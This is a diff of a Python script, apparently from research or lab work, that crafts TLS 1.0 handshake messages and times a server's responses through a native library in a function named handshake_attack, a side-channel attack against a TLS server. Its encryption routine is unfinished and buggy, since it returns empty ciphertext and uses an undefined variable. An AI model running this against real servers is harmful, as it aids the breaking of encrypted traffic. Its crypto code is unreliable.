@@ -1,17 +1,30 @@
 import code
 import gc
 import io
-
-# import rdtsc
 import secrets
 import socket
 
 from collections import namedtuple
 from tlslite.mathtls import MD5, SHA1, PRF, calcMasterSecret
+from tlslite.utils.cryptomath import HMAC_SHA1
 from tlslite.x509 import X509
 
 from ctypes import *
 from tlslite.constants import *
+
+
+class TimedResponse(Structure):
+    _fields_ = [
+        ("start_time", c_ulonglong),
+        ("end_time", c_ulonglong),
+        ("response_length", c_int),
+        ("response", c_byte * 4096),
+    ]
+
+
+timed_messenger = CDLL("/project/libtimedmessenger.so")
+timed_messenger.timed_send_and_receive.argtypes = [c_int, c_char_p, c_uint]
+timed_messenger.timed_send_and_receive.restype = TimedResponse
 
 
 TLS_VERSION_1_0 = 769
@@ -28,29 +41,35 @@ HELLO_COMPRESSION_METHOD_LENGTH_SIZE = 1
 HELLO_EXTENSION_SIZE = 6
 HELLO_EXTENSION_LENGTH_SIZE = 2
 
+EMPTY_BYTES = b""
+
 
 def recvall(sock):
-    all_data = []
-
     data = sock.recv(4096)
-    all_data.append(data)
+    return data
 
-    try:
-        while True:
-            data = sock.recv(4096, socket.MSG_DONTWAIT)
-            all_data.append(data)
+    # all_data = []
 
-    except io.BlockingIOError:
-        pass  #  no more data to recieve
+    # all_data.append(data)
 
-    finally:
-        return b"".join(all_data)
+    # try:
+    #     while True:
+    #         data = sock.recv(4096, socket.MSG_DONTWAIT)
+    #         all_data.append(data)
+
+    # except io.BlockingIOError:
+    #     pass  #  no more data to recieve
+
+    # finally:
+    #     return EMPTY_BYTES.join(all_data)
 
 
 def encode_list_to_bytes(items, item_size, length_size):
     length = len(items) * item_size
     raw_length = length.to_bytes(length_size, byteorder="big")
-    raw_items = b"".join([item.to_bytes(item_size, byteorder="big") for item in items])
+    raw_items = EMPTY_BYTES.join(
+        [item.to_bytes(item_size, byteorder="big") for item in items]
+    )
     return raw_length + raw_items
 
 
@@ -73,8 +92,8 @@ class Alert(namedtuple("Alert", ["level", "description"])):
 
     @classmethod
     def from_bytes(cls, raw):
-        level = int.from_bytes(raw_header[0], byteorder="big")
-        description = int.from_bytes(raw_header[1], byteorder="big")
+        level = int.from_bytes(raw[0:1], byteorder="big")
+        description = int.from_bytes(raw[1:2], byteorder="big")
 
         return cls(level, description)
 
@@ -126,7 +145,9 @@ class ClientFinished(
         negotiated_version = (negotiated_version[0], negotiated_version[1])
         negotiated_cipher_suite = server_hello.cipher_suite
 
-        handshake_messages = b"".join([m.to_bytes() for m in self.handshake_messages])
+        handshake_messages = EMPTY_BYTES.join(
+            [m.to_bytes() for m in self.handshake_messages]
+        )
 
         master_secret = calcMasterSecret(
             negotiated_version,
@@ -141,8 +162,7 @@ class ClientFinished(
             MD5(handshake_messages) + SHA1(handshake_messages),
             12,
         )
-        print(finished)
-        return finished
+        return bytes.fromhex("00" * 48)  # doesn't matter
 
     @classmethod
     def from_bytes(cls, raw):
@@ -188,7 +208,7 @@ class ClientKeyExchange(namedtuple("ClientKeyExchange", ["enc_premaster_secret"]
 
 class ServerHelloDone(namedtuple("ServerHelloDone", [])):
     def to_bytes(self):
-        return b""
+        return EMPTY_BYTES
 
     @classmethod
     def from_bytes(cls, raw):
@@ -200,7 +220,7 @@ class ServerHelloDone(namedtuple("ServerHelloDone", [])):
 
 class Certificate(namedtuple("Certificate", ["certificates"])):
     def to_bytes(self):
-        raw_certs = b""
+        raw_certs = EMPTY_BYTES
         for cert in self.certificates:
             raw_cert = cert.bytes
             raw_cert_length = int.to_bytes(len(raw_cert), 3, byteorder="big")
@@ -346,7 +366,7 @@ class ClientHello(
             self.extensions, HELLO_EXTENSION_SIZE, HELLO_EXTENSION_LENGTH_SIZE
         )
 
-        return b"".join(
+        return EMPTY_BYTES.join(
             [
                 raw_version,
                 raw_timestamp,
@@ -424,6 +444,66 @@ class Record(namedtuple("Record", ["content_type", "version", "body"])):
         return len(self.to_bytes())
 
 
+class Secrets(
+    namedtuple(
+        "Secrets",
+        [
+            "mac_write",
+            "mac_read",
+            "client_write",
+            "client_read",
+            "server_write",
+            "server_read",
+        ],
+    )
+):
+    @classmethod
+    def from_master(cls, master_secret):
+        # TODO
+        return cls(
+            master_secret,
+            master_secret,
+            master_secret,
+            master_secret,
+            master_secret,
+            master_secret,
+        )
+
+
+def encrypt_message(message, sequence_number, secrets, ciphersuite):
+    """
+    Encrypts a block of data as specified by the
+    TLS_RSA_WITH_AES_128_CBC_SHA scheme.
+
+    References:
+      - https://tools.ietf.org/html/rfc2246#section-6.2.3.2
+      - https://www.cryptologie.net/article/340/tls-pre-master-secrets-and-master-secrets/
+      -
+    """
+    if ciphersuite == CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA:
+        block_length = 48
+        padding_length_length = 1
+
+        mac = HMAC_SHA1(secrets.mac_write, sequence_num + message)
+        mac_length = len(mac)
+
+        length_before_padding = len(message) + len(mac) + padding_length_length
+        padding_length = block_length - length_before_padding
+        padding = padding_length.to_bytes(1, byteorder="big") * (padding_length + 1)
+
+        plaintext = message + mac + padding
+        # Example for AES:
+        # https://cryptography.io/en/latest/hazmat/primitives/symmetric-encryption/#cryptography.hazmat.primitives.ciphers.Cipher
+        ciphertext = EMPTY_BYTES
+
+        return ciphertext
+
+    else:
+        raise Exception("Only TLS_RSA_WITH_AES_128_CBC_SHA cipher suite is supported")
+
+    pass
+
+
 def handshake_attack(sock, g):
     # -> Client Hello
     client_hello = Record(
@@ -435,8 +515,8 @@ def handshake_attack(sock, g):
                 TLS_VERSION_1_0,
                 2451205766,
                 secrets.token_bytes(28),
-                b"",
-                [CipherSuite.TLS_RSA_WITH_AES_256_CBC_SHA],
+                EMPTY_BYTES,
+                [CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA],
                 [0],
                 [X509_CERT_TYPE_EXTENSION],
             ),
@@ -489,14 +569,19 @@ def handshake_attack(sock, g):
     )
 
     # Go!
-    start_time = rdtsc.get_cycles()
+    conn_fd = c_int(sock.fileno())
+    message = create_string_buffer(final_message)
+    message_length = c_uint(len(message))
 
-    sock.send(final_message)
-    response = recvall(sock)
+    tr = timed_messenger.timed_send_and_receive(conn_fd, message, message_length)
+    response = bytes(tr.response[0 : tr.response_length])
 
-    end_time = rdtsc.get_cycles()
+    alert = Record.from_bytes(response)
+    assert alert.content_type == ContentType.alert
+    assert alert.body.level == AlertLevel.fatal
+    assert alert.body.description == AlertDescription.bad_record_mac
 
-    return start_time, response, end_time
+    return tr.start_time, response, tr.end_time
 
 
 if __name__ == "__main__":
@@ -504,7 +589,7 @@ if __name__ == "__main__":
     sock.connect(("antelope", 443))
 
     gc.disable()
-    start, response, end = handshake_attack(sock, g=0)
+    time = handshake_attack(sock, g=0)
     gc.collect()
 
     code.interact(local=locals())
